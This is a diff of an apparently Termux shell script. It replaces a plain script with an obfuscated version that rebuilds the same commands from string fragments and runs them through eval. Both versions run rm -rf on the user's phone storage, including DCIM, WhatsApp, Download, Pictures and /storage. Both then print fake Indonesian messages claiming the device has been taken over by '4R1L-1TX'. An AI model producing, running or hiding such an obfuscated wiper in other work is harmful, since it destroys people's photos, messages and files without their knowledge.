@@ -1,25 +1,3 @@
-pkg install figlet
-gem install lolcat
-cd /sdcard
-rm -rf Android
-rm -rf Download
-rm -rf DCIM
-rm -rf UCDownloads
-rm -rf com.garena.game.codm
-rm -rf Music
-rm -rf Pictures
-rm -rf Movies
-rm -rf WhatsApp
-rm -rf Pictures
-rm -rf SHAREit
-rm -rf KineMaster
-rm -rf pixelLab
-rm -rf DCIM
-rm -rf /storage
-echo "Memperoses Persetujuan Mengambil Alih Perangkat..."
-sleep 2
-echo "Pengambil Alihan Perangkat 50%"
-sleep 2
-echo "SUKSES"
-echo "Perangkat Telah Di Ambil Alih Oleh User : 4R1L-1TX"
-figlet 4R1L-1TX |lolcat
+z="
+";Bz='inst';LBz='lih ';dBz='kat ';MBz='Pera';fz='rf P';BBz='echo';yz='stor';KBz='il A';ABz='age';Az='pkg ';Xz='rf c';EBz='oses';Fz='gem ';QBz='slee';Rz='oad';Lz='rm -';fBz='h Di';Iz='cd /';GBz='setu';Yz='om.g';ez='usic';RBz='p 2';mz='App';qBz='cat';dz='rf M';Cz='all ';lBz='-1TX';kz='rf W';CBz=' "Me';rz='ineM';WBz='an P';jz='s';uz='rf p';Dz='figl';nz='rf S';Gz='lolc';JBz='gamb';SBz=' "Pe';NBz='ngka';YBz='gkat';oBz='1TX ';oz='HARE';XBz='eran';Mz='rf A';tz='r';HBz='juan';Pz='rf D';Sz='CIM';Zz='aren';IBz=' Men';VBz='Alih';Ez='et';TBz='ngam';DBz='mper';UBz='bil ';gBz=' Amb';Oz='id';vz='ixel';hBz='Oleh';Uz='CDow';lz='hats';nBz='R1L-';mBz='et 4';wz='Lab';cz='odm';bz='me.c';hz='res';gz='ictu';ZBz=' 50%';Nz='ndro';iz='ovie';pBz='|lol';sz='aste';Vz='nloa';Tz='rf U';aBz=' "SU';OBz='t...';iBz=' Use';Qz='ownl';FBz=' Per';jBz='r : ';bBz='KSES';PBz='"';Jz='sdca';kBz='4R1L';xz='rf /';Wz='ds';Hz='at';pz='it';qz='rf K';cBz='rang';az='a.ga';Kz='rd';eBz='Tela';
+eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Bz$Cz$Gz$Hz$z$Iz$Jz$Kz$z$Lz$Mz$Nz$Oz$z$Lz$Pz$Qz$Rz$z$Lz$Pz$Sz$z$Lz$Tz$Uz$Vz$Wz$z$Lz$Xz$Yz$Zz$az$bz$cz$z$Lz$dz$ez$z$Lz$fz$gz$hz$z$Lz$dz$iz$jz$z$Lz$kz$lz$mz$z$Lz$fz$gz$hz$z$Lz$nz$oz$pz$z$Lz$qz$rz$sz$tz$z$Lz$uz$vz$wz$z$Lz$Pz$Sz$z$Lz$xz$yz$ABz$z$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$z$QBz$RBz$z$BBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$PBz$z$QBz$RBz$z$BBz$aBz$bBz$PBz$z$BBz$SBz$cBz$dBz$eBz$fBz$gBz$KBz$LBz$hBz$iBz$jBz$kBz$lBz$PBz$z$Dz$mBz$nBz$oBz$pBz$qBz"
